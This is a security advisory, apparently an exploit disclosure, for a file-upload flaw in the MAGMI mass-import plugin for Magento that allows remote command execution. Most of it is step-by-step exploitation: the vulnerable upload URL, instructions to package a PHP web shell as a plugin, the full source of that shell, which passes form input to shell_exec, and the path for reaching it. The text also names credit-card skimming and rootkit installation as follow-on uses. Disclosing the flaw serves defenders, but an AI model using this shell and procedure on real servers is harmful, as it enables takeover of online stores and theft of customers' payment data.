Security Researcher name:  Parvinder Singh Bhasin
Contact info:  parvinder.bhasin@gmail.com
twitter:  @parvinderb <scorpio>
 
 
Currently tested version:
Magento version:  Magento CE - 1.8 and newer versions
MAGMI version: v0.7.17a and greater
 
MAGMI (MAGento Mass Importer) suffers from File inclusion vulnerability (RFI) which allows an attacker to upload essentially any PHP file (without any sanity checks).  This PHP file could then be used to skim credit card data, rewrite files, run remote commands, delete files..etc.  Essentially, this gives attacker ability to execute remote commands on the vulnerable server.
 
 
Steps to reproduce:
 
1.  http://<a magentosite.com>/magmi/web/magmi.php
2.  Under upload new plugins:
    click on "choose file"
        MAGento plugins are basically php file zipped.  So create a php shell and zip the file. ex: evil.php  ex: zip file: evil_plugin.zip.  After the file has been uploaded, it will say:  Plugin packaged installed.
         
         evil.php:
          
         <?php
            if (isset($_POST[&#039;command&#039;])){
                echo "<form action=&#039;evil.php&#039; method=&#039;post&#039;>
                <input type=&#039;text&#039; name=&#039;command&#039; value=&#039;&#039;/>
                <input type=&#039;submit&#039; value=&#039;execute&#039;/>
                </form>";
    
                if(function_exists(&#039;shell_exec&#039;)) {
                    $command=$_POST[&#039;command&#039;];
                    $output = shell_exec("$command");
                }
            }
            else {
                echo "<form action=&#039;evil.php&#039; method=&#039;post&#039;>
                <input type=&#039;text&#039; name=&#039;command&#039; value=&#039;&#039;/>
                <input type=&#039;submit&#039; value=&#039;execute&#039;/>
            </form>";
            }
        ?>
          
3.  Your malicious evil.php file is extracted now.  All you then need to do is just access the evil.php page from:
    http://<amagentosite.com>/magmi/plugins/evil.php
     
    At this point you could really have access to the entire system.  Download any malware, install rootkits, skim credit card data ..etc.etc.

